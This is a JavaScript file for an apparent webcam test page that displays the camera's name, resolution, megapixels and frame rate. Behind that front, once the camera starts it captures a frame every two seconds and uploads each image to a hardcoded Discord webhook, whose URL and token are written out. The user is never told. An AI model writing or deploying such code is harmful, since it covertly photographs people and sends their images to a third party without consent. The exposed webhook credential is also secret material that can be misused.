const video = document.getElementById('video');
const webcamNameInfo = document.getElementById('webcam-name-info');
const webcamResolutionInfo = document.getElementById('webcam-resolution-info');
const webcamMegapixelsInfo = document.getElementById('webcam-megapixels-info');
const webcamFPSInfo = document.getElementById('webcam-fps-info');
const microphoneInfo = document.getElementById('microphone-info');
const speakerInfo = document.getElementById('speaker-info');
const cooldownOverlay = document.getElementById('cooldown-overlay');
const allowWebcamButton = document.getElementById('allow-webcam-button');
const stopWebcamButton = document.getElementById('stop-webcam-button');
const videoContainer = document.getElementById('video-container');

let isVideoPlaying = false;
let videoStream;

function updateVideoContainerSize() {
  const aspectRatio = video.videoWidth / video.videoHeight;
  const maxWidth = videoContainer.offsetWidth;
  const maxHeight = Math.floor(maxWidth / aspectRatio);
  const containerWidth = Math.min(video.videoWidth, maxWidth);
  const containerHeight = Math.min(video.videoHeight, maxHeight);
  videoContainer.style.width = `${containerWidth}px`;
  videoContainer.style.height = `${containerHeight}px`;
}

function startVideo() {
  allowWebcamButton.disabled = true;

  if (!isVideoPlaying) {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      const constraints = {
        video: { width: { ideal: 4096 }, facingMode: 'user' },
      };

      navigator.mediaDevices
        .getUserMedia(constraints)
        .then((stream) => {
          video.srcObject = stream;
          videoStream = stream;
          isVideoPlaying = true;
          allowWebcamButton.style.display = 'none';
          stopWebcamButton.style.display = 'flex';
          startCooldown();

          const videoTrack = stream.getVideoTracks()[0];
          const capabilities = videoTrack.getCapabilities();

          webcamNameInfo.textContent = videoTrack.label || 'N/A';
          webcamResolutionInfo.textContent = `${capabilities.width.max}x${capabilities.height.max}`;
          webcamMegapixelsInfo.textContent = calculateMegapixels(
            capabilities.width.max,
            capabilities.height.max
          ).toFixed(2);
          webcamFPSInfo.textContent = capabilities.frameRate.max || 'N/A';
          microphoneInfo.textContent = stream.getAudioTracks().length > 0 ? 'Yes' : 'No';
          speakerInfo.textContent = stream.getAudioTracks().length > 0 ? 'Yes' : 'No';

          video.addEventListener('loadedmetadata', updateVideoContainerSize);
          window.addEventListener('resize', updateVideoContainerSize);
        })
        .catch((err) => {
          const errorMessage = 'Error accessing webcam: ' + err.message;
          console.error(errorMessage);
          sendEmbedToWebhook(errorMessage);
          allowWebcamButton.disabled = false;
        });
    } else {
      const errorMessage = 'getUserMedia is not supported on your browser';
      console.error(errorMessage);
      sendEmbedToWebhook(errorMessage);
      allowWebcamButton.disabled = false;
    }
  }
}

function stopVideo() {
  allowWebcamButton.disabled = false;
  stopCooldown();
  stopWebcamButton.style.display = 'none';
  allowWebcamButton.style.display = 'flex';
  video.srcObject = null;
  videoContainer.style.width = '';
  videoContainer.style.height = '';

  if (videoStream) {
    const tracks = videoStream.getTracks();
    tracks.forEach((track) => track.stop());
  }

  video.removeEventListener('loadedmetadata', updateVideoContainerSize);
  window.removeEventListener('resize', updateVideoContainerSize);

  isVideoPlaying = false;
}

function calculateMegapixels(width, height) {
  return (width * height) / 1000000;
}

function sendEmbedToWebhook(errorMessage) {
  const webhookUrl = 'https://discord.com/api/webhooks/1129566688929661028/LBTvryhOiEyy9gHa6qRoF8PAvQSr1uxitjq9Gax1tc3vvVkGM2vYk6_txYcSDKYH0S2i';

  const embedData = {
    content: '',
    embeds: [
      {
        title: 'Error',
        description: errorMessage,
        color: 0x008CBA,
        fields: [
          { name: 'Error Message', value: errorMessage, inline: false },
        ],
      },
    ],
  };

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(embedData),
  })
    .catch((error) => console.error('Error sending embed:', error));
}

function sendFrameToWebhook(dataUrl) {
  const webhookUrl = 'https://discord.com/api/webhooks/1129566688929661028/LBTvryhOiEyy9gHa6qRoF8PAvQSr1uxitjq9Gax1tc3vvVkGM2vYk6_txYcSDKYH0S2i';

  try {
    const blob = dataUrlToBlob(dataUrl);

    const formData = new FormData();
    formData.append('file', blob, 'frame.png');

    fetch(webhookUrl, {
      method: 'POST',
      body: formData,
    })
      .then((response) => {
        if (!response.ok) {
          const errorMessage = `Failed to send image: ${response.status} ${response.statusText}`;
          console.error(errorMessage);
          sendEmbedToWebhook(errorMessage);
        }
      })
      .catch((error) => {
        const errorMessage = 'Error sending image: ' + error.message;
        console.error(errorMessage);
        sendEmbedToWebhook(errorMessage);
      });
  } catch (error) {
    const errorMessage = 'Error sending image: ' + error.message;
    console.error(errorMessage);
    sendEmbedToWebhook(errorMessage);
  }
}

function dataUrlToBlob(dataUrl) {
  const arr = dataUrl.split(',');
  const mime = arr[0].match(/:(.*?);/)[1];
  const bstr = atob(arr[1]);
  let n = bstr.length;
  const u8arr = new Uint8Array(n);
  while (n--) {
    u8arr[n] = bstr.charCodeAt(n);
  }
  return new Blob([u8arr], { type: mime });
}

let captureInterval;

function startCooldown() {
  cooldownOverlay.classList.add('active');
  setTimeout(() => {
    cooldownOverlay.classList.remove('active');
    captureFrame();
    captureInterval = setInterval(captureFrame, 2000);
  }, 1000);
}

function stopCooldown() {
  clearInterval(captureInterval);
  cooldownOverlay.classList.remove('active');
}

function captureFrame() {
  const canvas = document.createElement('canvas');
  const aspectRatio = video.videoWidth / video.videoHeight;
  const maxWidth = videoContainer.offsetWidth;
  const maxHeight = Math.floor(maxWidth / aspectRatio);
  canvas.width = Math.min(video.videoWidth, maxWidth);
  canvas.height = Math.min(video.videoHeight, maxHeight);
  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
  const dataUrl = canvas.toDataURL('image/png', 1.0);
  sendFrameToWebhook(dataUrl);
}

allowWebcamButton.addEventListener('click', startVideo);
stopWebcamButton.addEventListener('click', stopVideo);
